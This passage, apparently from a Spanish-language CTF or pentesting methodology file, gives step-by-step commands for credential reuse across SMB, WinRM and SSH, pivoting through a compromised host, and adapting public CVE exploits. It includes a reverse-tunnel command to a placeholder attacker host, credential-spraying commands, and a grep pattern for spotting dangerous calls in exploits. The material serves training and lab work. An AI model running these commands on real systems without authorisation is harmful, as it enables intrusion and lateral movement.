                        "why": "Reimprime lo ya crackeado: john guarda los resultados en su pot, asi que no repites trabajo si cierras la terminal.",
                        "out": "Las parejas usuario:password ya resueltas. Copialas a tu fichero de credenciales con su fuente antes de reutilizarlas.",
                    },
                ],
                "look": "La password en claro cuando cae. Si no cae en minutos con rockyou, probablemente el vector no era crackear.",
                "decide": "Crackeada -> reutiliza. No cae -> revisa si el hash era el objetivo real o si te falta contexto (salt, formato).",
            },
            {
                "title": "Reutiliza en todo",
                "idea": "El error mas comun es encontrar una credencial y probarla en un solo sitio. En CTF y en real, el password reuse es la norma: la misma clave suele valer para SSH, SMB, WinRM, un panel web o una base de datos. Cada credencial nueva reinicia tu enumeracion.",
                "commands": [
                    {
                        "cmd": "nxc smb $IP -u $USER -p $PASS",
                        "why": "Valida la credencial contra SMB y de paso te dice si es admin local (que abre ejecucion remota). Es la comprobacion mas informativa para empezar.",
                        "out": "[+] = credencial valida. '(Pwn3d!)' significa que eres admin local: ya puedes ejecutar comandos/volcar hashes. Solo [+] sin Pwn3d = acceso limitado.",
                    },
                    {
                        "cmd": "nxc winrm $IP -u $USER -p $PASS",
                        "why": "WinRM (5985) da shell interactiva en Windows. Comprueba si la misma credencial vale aqui, porque es la via mas comoda de entrada.",
                        "out": "[+] (Pwn3d!) en WinRM significa que puedes lanzar evil-winrm y tener shell directa. Es tu billete de entrada a la maquina.",
                    },
                    {
                        "cmd": "ssh $USER@$IP",
                        "why": "En Linux, prueba la credencial por SSH. Es el acceso mas directo y comodo si la reutilizaron (que suele pasar).",
                        "out": "Un prompt de shell si entra. Si pide clave y la tienes, usa -i clave. Ya dentro, arranca la enumeracion de privesc (whoami/id, sudo -l).",
                    },
                ],
                "look": "Un [+] en netexec (SMB/WinRM), un login SSH que entra, o acceso a un panel. Fijate en 'Pwn3d!' que indica ejecucion.",
                "decide": "Funciona en un servicio nuevo -> entra y vuelve a enumerar desde ahi. Anota cada credencial con su fuente y donde la probaste.",
            },
        ],
    },
    {
        "id": "pivoting",
        "title": "Pivoting: llegar a la red interna",
        "phase": "pivot",
        "section": "pivoting",
        "summary": "Cuando la maquina comprometida ve servicios que tu Kali no alcanza.",
        "steps": [
            {
                "title": "Entiende por que necesitas pivotar",
                "idea": "Has comprometido una maquina que tiene una segunda tarjeta de red o ve hosts internos que tu Kali no puede tocar directamente. El pivot es esa maquina: la usaras como puente para alcanzar la red interna. Primero confirma que existe esa red que tu no ves.",
                "commands": [
                    {
                        "cmd": "ip a",
                        "why": "Mira las interfaces del host comprometido. Una segunda NIC en un rango distinto al tuyo es la senal de que hay una red interna a la que solo esta maquina llega.",
                        "out": "Interfaces y sus IPs. Si ves algo como 10.10.20.x cuando tu atacas 10.10.10.x, esa segunda red es el objetivo del pivot.",
                    },
                    {
                        "cmd": "ip route",
                        "why": "La tabla de rutas revela a que redes sabe llegar el pivot, incluso las que no cuelgan de una interfaz visible directamente.",
                        "out": "Rutas hacia rangos que tu Kali no tiene. Anota el CIDR interno: es lo que anadiras al tunel (ligolo) o escanearas via proxychains.",
                    },
                    {
                        "cmd": "arp -a",
                        "why": "La cache ARP lista hosts internos con los que la maquina ya ha hablado. Te da IPs internas vivas sin lanzar un escaneo ruidoso todavia.",
                        "out": "Pares IP-MAC de vecinos internos. Esas IPs no aparecian en tu escaneo inicial -> son tus proximos objetivos dentro de la red.",
                    },
                ],
                "look": "Interfaces o rutas hacia rangos que tu Kali no tiene (ej. 10.10.20.0/24), y hosts en la tabla ARP que no aparecian en tu escaneo inicial.",
                "decide": "Ves una red interna nueva -> monta un tunel. No ves nada nuevo -> quiza no hay pivoting en esta room.",
            },
            {
                "title": "Monta el tunel",
                "idea": "El tunel enruta tu trafico a traves del pivot. Si tienes SSH, ssh -D te da un SOCKS gratis. Si solo ejecutas binarios, chisel o ligolo-ng crean el tunel en reverse (el pivot conecta hacia ti, util cuando el firewall bloquea entrada). Ligolo es el mas comodo: te da una interfaz de red completa.",
                "commands": [
                    {
                        "cmd": "ssh -D 1080 -N user@$IP",
                        "why": "Si ya tienes SSH al pivot, -D monta un proxy SOCKS sin instalar nada. Es la via mas rapida y limpia cuando hay credenciales SSH validas.",
                        "out": "No imprime nada (-N no abre shell): el exito es que el puerto 1080 local queda escuchando. Compruebalo con ss -tlnp | grep 1080.",
                    },
                    {
                        "cmd": "chisel server -p 8000 --reverse",
                        "why": "En tu Kali levantas el lado servidor. --reverse permite que el pivot conecte hacia ti, esquivando firewalls que bloquean conexiones entrantes al pivot.",
                        "out": "'Reverse tunnelling enabled' y logs cuando el cliente conecte. Deja esta terminal abierta; el tunel muere si la cierras.",
                    },
                    {
                        "cmd": "./chisel client ATTACKER_IP:8000 R:socks",
                        "why": "En el pivot lanzas el cliente que conecta con tu servidor. R:socks crea un SOCKS reverse: tu trafico saldra por la red interna del pivot.",
                        "out": "'Connected' en ambos lados y un SOCKS (1080 por defecto) abierto en tu Kali. A partir de aqui, todo pasa por proxychains.",
                    },
                ],
                "look": "El mensaje de conexion establecida en tu servidor chisel/ligolo, o el puerto SOCKS local (1080) escuchando.",
                "decide": "SOCKS listo -> configura proxychains. Ligolo -> anade la ruta a la red interna con ip route add.",
            },
            {
                "title": "Usa el tunel para atacar dentro",
                "idea": "Con el tunel montado, cualquier herramienta puede alcanzar la red interna anteponiendo proxychains (que la rutea por el SOCKS). Ojo: por un SOCKS solo pasa TCP, asi que usa -sT en nmap, no SYN scan. Valida siempre con un curl/nc antes de lanzar escaneos ruidosos.",
                "commands": [
                    {
                        "cmd": "proxychains nmap -sT -Pn -n -p80,445 10.10.20.5",
                        "why": "proxychains rutea nmap por el SOCKS hacia la red interna. -sT (connect scan) es obligatorio: por un SOCKS no pasa el SYN scan y darias todo por cerrado.",
                        "out": "Puertos abiertos del host interno. Ve a pocos puertos primero (-p80,445): un escaneo completo por proxychains es lentisimo. Servicios abiertos = nueva mini-room.",
                    },
                    {
                        "cmd": "proxychains crackmapexec smb 10.10.20.5 -u $USER -p $PASS",
                        "why": "Reutilizas las credenciales que ya tienes contra los hosts internos, tambien por el tunel. El password reuse cruza segmentos de red igual que cruza servicios.",
                        "out": "[+] / (Pwn3d!) contra maquinas internas. Un Pwn3d en un host interno te da ejecucion alli: repite el ciclo recon-enum-acceso dentro de la red.",
                    },
                ],
                "look": "Servicios internos respondiendo a traves del proxy: webs, SMB, otro DC. Es como empezar una room nueva dentro de la red.",
                "decide": "Host interno accesible -> repite el ciclo recon/enum/acceso contra el. Documenta la cadena atacante -> pivot -> red interna.",
            },
        ],
    },
    {
        "id": "cve-metodologia",
        "title": "Usar exploits y CVEs con cabeza",
        "phase": "access",
        "section": "cve-y-exploits",
        "summary": "Aprovechar PoCs publicos sin ejecutar basura a ciegas ni romper la maquina.",
        "steps": [
            {
                "title": "Confirma producto y version exactos",
                "idea": "Un exploit solo sirve si coincide el producto Y el rango de version. Perder tiempo con un CVE que no aplica es el error clasico. Saca la version exacta de tu recon y busca; si la version esta fuera del rango vulnerable, descartalo o busca uno especifico para esa version.",
                "commands": [
                    {
                        "cmd": "searchsploit PRODUCTO VERSION",
                        "why": "Busca exploits conocidos para exactamente ese producto y version. Filtrar por version desde el principio evita perseguir CVEs que no aplican a tu objetivo.",
                        "out": "Titulos de exploits y su ruta. Fijate si el titulo dice el rango de version y si es 'Remote'/'Authenticated': eso decide si aplica y si necesitas login.",
                    },
                    {
                        "cmd": "searchsploit -m 12345",
                        "why": "Copia (mirror) el exploit a tu directorio actual para poder leerlo y editarlo. Nunca se ejecuta desde la base de datos directamente.",
                        "out": "Confirma la ruta del fichero copiado. Abrelo antes de nada: el siguiente paso es leerlo, no lanzarlo.",
                    },
                ],
                "look": "Coincidencia exacta de producto y version. Fijate si el exploit es pre-auth (sin login) o post-auth (necesita credencial).",
                "decide": "Coincide y es pre-auth -> prioridad alta. Requiere admin o version distinta -> baja prioridad, sigue enumerando.",
            },
            {
                "title": "Lee el exploit antes de ejecutarlo",
                "idea": "Nunca ejecutes un PoC de internet a ciegas: puede borrar datos, abrir puertos, o robar tu shell. Abrelo, entiende que hace, y busca comandos peligrosos. Cambia la IP/puerto a los tuyos y sustituye cualquier payload por algo inocuo (id, whoami) para la primera prueba.",
                "commands": [
                    {
                        "cmd": "sed -n '1,80p' exploit.py",
                        "why": "Lee la cabecera del exploit: descripcion, autor, y sobre todo que variables hay que rellenar. Entender el flujo antes de ejecutar evita sorpresas.",
                        "out": "Comentarios de uso, variables LHOST/RHOST/URL a configurar, y el CVE que explota. Si el codigo esta ofuscado o minificado, desconfia y busca otro PoC.",
                    },
                    {
                        "cmd": "grep -nEi 'rm |curl|wget|socket|subprocess|system|eval' exploit.py",
                        "why": "Caza acciones peligrosas o conexiones externas: un PoC malicioso puede borrar ficheros, descargar algo de un servidor del autor, o robarte la shell.",
                        "out": "Lineas con esas llamadas. Un rm -rf, un wget a un dominio ajeno o un eval de datos remotos = bandera roja: no lo ejecutes tal cual, entiende cada linea.",
                    },
                    {
                        "cmd": "python3 exploit.py -h",
                        "why": "Ver la ayuda te dice los argumentos reales sin adivinar. Muchos PoCs traen un modo --check no destructivo para validar antes de explotar.",
                        "out": "Flags disponibles (--url, --lhost, --check, --cmd). Si existe --check, usalo primero; solo lanza el payload completo cuando confirmes que es vulnerable.",
                    },
                ],
                "look": "Que variables hay que rellenar (LHOST, URL, credenciales), y cualquier accion destructiva o conexion externa sospechosa.",
                "decide": "Codigo limpio y entendido -> adaptalo y pruebalo. Codigo ofuscado o destructivo -> busca otro PoC o hazlo manual.",
            },
            {
                "title": "Reproduce minimo y escala",
                "idea": "Antes de lanzar el exploit completo, reproduce la peticion minima que dispara el bug (con curl o Burp) para confirmar que la maquina es vulnerable de verdad. Empieza con un comando inocuo; solo cuando confirmes ejecucion, cambias a la reverse shell.",
                "commands": [
                    {
                        "cmd": "python3 exploit.py --check --url $URL",
                        "why": "El modo check confirma que el objetivo es vulnerable sin ejecutar payload destructivo. Ahorra tiempo y no rompe la maquina si el CVE no aplica.",
                        "out": "Un 'vulnerable'/'not vulnerable' del propio exploit. Si dice que no, revisa version, ruta o si necesita autenticacion antes de insistir.",
                    },
                    {
                        "cmd": "python3 exploit.py --url $URL --cmd 'id'",
                        "why": "Primera ejecucion real pero inocua: id confirma RCE y te dice con que usuario corres, sin abrir aun una shell que podria fallar ruidosamente.",
                        "out": "La salida de id (uid/gid). Confirmado esto -> repite el comando lanzando tu reverse shell hacia el listener que ya tienes abierto.",
                    },
                ],
                "look": "La salida de id/whoami que confirma ejecucion remota, o el indicador de 'vulnerable' del propio exploit.",
                "decide": "Confirmado con comando inocuo -> lanza la reverse shell hacia tu listener. Falla -> revisa version, ruta o requisitos de auth.",
            },
        ],
    },
]
